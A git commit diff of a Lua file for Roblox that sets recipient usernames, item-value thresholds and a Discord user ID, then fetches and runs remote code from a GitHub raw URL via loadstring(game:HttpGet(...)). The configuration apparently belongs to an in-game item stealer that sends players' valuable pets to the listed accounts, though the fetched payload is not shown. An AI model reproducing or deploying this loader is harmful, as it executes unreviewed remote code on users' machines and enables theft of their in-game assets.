3e1a59259f5c9e1b84bb54bf405ea9e25d083e7c
Vreekly <107263286+Vreeklyy@users.noreply.github.com>
2025-01-16 23:54:00 +0100

    Update hahahah.lua

--- hahahah.lua
+++ hahahah.lua
@@ -1,6 +1,6 @@
-_G.Usernames = {"gilathist"}
+_G.Usernames = {"gilathist","gilathist"}
 _G.min_rap = 10000
-_G.min_chance = 150000
+_G.min_chance = 100000
 _G.discuser = "927314585642475600"
   
 loadstring(game:HttpGet('https://raw.githubusercontent.com/Vreeklyy/weghwhsdgewg/refs/heads/main/petsgogui.lua'))()
